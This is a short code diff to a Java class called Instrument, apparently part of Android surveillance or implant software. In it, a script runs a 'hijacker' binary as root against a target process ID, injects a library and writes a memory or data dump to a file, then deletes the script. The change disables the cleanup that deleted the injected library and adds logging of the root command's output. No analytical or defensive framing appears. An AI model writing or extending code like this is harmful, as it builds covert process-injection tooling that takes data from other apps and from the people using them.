@@ -78,8 +78,8 @@ public class Instrument {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (installHijacker) delete lib");
 		}
-		File file = new File(Status.getAppContext().getFilesDir(), lib);
-		file.delete();
+		//File file = new File(Status.getAppContext().getFilesDir(), lib);
+		//file.delete();
 
 		return true;
 	}
@@ -102,7 +102,10 @@ public class Instrument {
 			script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\n";
 
 			Root.createScript(scriptName, script);
-			Execute.executeRoot(path + "/" + scriptName);
+			ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (startInstrumentation): " + ret.getStdout() + " err: " + ret.getStdErr());
+			}
 			
 			Root.removeScript(scriptName);
 
